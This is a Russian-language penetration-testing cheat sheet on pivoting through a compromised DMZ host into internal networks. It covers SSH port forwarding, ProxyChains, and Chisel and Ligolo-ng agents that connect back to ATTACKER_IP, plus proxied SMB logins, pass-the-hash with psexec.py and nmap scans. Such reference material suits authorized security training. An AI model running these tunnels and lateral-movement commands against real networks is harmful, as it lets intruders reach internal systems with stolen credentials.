# PIVOTING — ПРОХОД ВО ВНУТРЕННИЕ СЕТИ ЧЕРЕЗ ПРОМЕЖУТОЧНЫЙ ХОСТ
## Что это

Pivoting — техника, при которой скомпрометированный хост используется как реле для доступа к сетям, недоступным напрямую с атакующей машины.

## Когда нужен пивотинг

Атакующая машина и целевой хост находятся в разных сетях, между которыми нет прямого маршрута. При этом существует промежуточный хост (pivot), у которого есть доступ к обеим сетям.

**Пример:** вы взломали сервер в DMZ. У этого сервера есть доступ к внутренней корпоративной сети, куда ваша атакующая машина попасть не может. Через этот сервер вы туннелируете трафик во внутреннюю сеть.


## ДВА ТИПА SSH ТУННЕЛЕЙ

### 1. Local Port Forward (`-L`)

Создает локальный порт на вашей машине. Трафик на этот порт уходит по SSH туннелю на промежуточный хост, а тот перенаправляет его на указанный IP и порт во внутренней сети.

**Формат:**
ssh -L ЛОКАЛЬНЫЙ_ПОРТ:ЦЕЛЕВОЙ_IP:ЦЕЛЕВОЙ_ПОРТ ПОЛЬЗОВАТЕЛЬ@ПРОМЕЖУТОЧНЫЙ_ХОСТ -N

**Пример:**
ssh -L 13389:192.168.100.10:3389 user@pivot -N

Теперь, подключившись к `127.0.0.1:13389` на своей машине, вы попадете на RDP сервер 192.168.100.10 во внутренней сети.

**Когда использовать:** когда нужен доступ к одному конкретному хосту и порту.


**Ограничение:** для каждого нового хоста или порта нужен отдельный туннель.

### 2. Dynamic Port Forward (`-D`)

Создает SOCKS прокси на вашей машине. Любой инструмент, поддерживающий SOCKS (или обернутый в ProxyChains), может отправлять трафик через этот прокси. Трафик выходит из промежуточного хоста и может достигать любых хостов во внутренней сети.

**Формат:**
ssh -f -D ЛОКАЛЬНЫЙ_ПОРТ ПОЛЬЗОВАТЕЛЬ@ПРОМЕЖУТОЧНЫЙ_ХОСТ -N

**Пример:**
ssh -f -D 1080 user@pivot -N

**Когда использовать:** когда нужен доступ ко всей внутренней сети (разные хосты и порты).


## НАСТРОЙКА PROXYCHAINS

ProxyChains — утилита, которая заставляет любое приложение отправлять TCP трафик через SOCKS прокси.

### Конфигурация `/etc/proxychains.conf`

В секции `[ProxyList]` указать:

socks4 127.0.0.1 1080

### Использование

Добавить `proxychains` перед любой командой:

proxychains curl http://192.168.100.50
proxychains nxc smb 192.168.100.10 -u admin -p pass
proxychains psexec.py -hashes :hash user@192.168.100.10

*** Что происходит при proxychains nxc smb 192.168.100.10 ***
proxychains перенаправляет трафик nxc на локальный порт 127.0.0.1:1080. Этот порт слушает SSH клиент, который вы запустили с флагом -D 1080. SSH клиент упаковывает полученные данные в протокол SSH и отправляет их по туннелю на промежуточный хост (pivot). Там SSH сервер распаковывает данные и устанавливает реальное соединение с 192.168.100.10:445 от своего имени.

## БЫСТРАЯ ШПАРГАЛКА

# SSH dynamic forward (SOCKS)
ssh -f -D 1080 user@pivot -N

# ProxyChains с разными инструментами
proxychains curl http://INTERNAL_IP
proxychains nxc smb INTERNAL_IP -u user -p pass
proxychains psexec.py -hashes :hash user@INTERNAL_IP

# nmap через ProxyChains
proxychains nmap -sT -Pn -p 445 INTERNAL_IP

# Chisel (сервер)
chisel server --port 8080 --reverse

# Chisel (клиент)
chisel.exe client ATTACKER_IP:8080 R:1080:socks

# Ligolo-ng (прокси)
sudo ./proxy -selfcert

# Ligolo-ng (агент)
./agent -connect ATTACKER_IP:11601 -accept-fingerprint FINGERPRINT

# Ligolo-ng (маршрут)
sudo ip route add INTERNAL_SUBNET dev ligolo
